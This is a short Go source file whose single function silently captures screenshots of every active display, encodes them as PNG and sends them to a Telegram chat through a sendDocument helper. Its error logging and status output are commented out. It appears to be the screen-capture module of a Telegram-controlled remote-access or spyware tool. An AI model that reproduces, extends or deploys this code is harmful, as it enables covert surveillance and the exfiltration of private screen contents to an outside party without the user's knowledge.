package main

import (
	_ "embed"
	"fmt"
	"bytes"
	"image/png"
	"github.com/kbinani/screenshot"
)


func takeScreenshots(chatID int64) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			// log.Printf("Error capturing screenshot: %v", err)
			continue
		}

		// Create a buffer to store the image
		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			// log.Printf("Error encoding image: %v", err)
			continue
		}

		fileName := fmt.Sprintf("screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())

		// Send the image to Telegram
		err = sendDocument(chatID, fileName, buf.Bytes())
		if err != nil {
			// log.Printf("Error sending document: %v", err)
			continue
		}

		// fmt.Printf("Sent screenshot #%d : %v \"%s\"\n", i, bounds, fileName)
	}
}
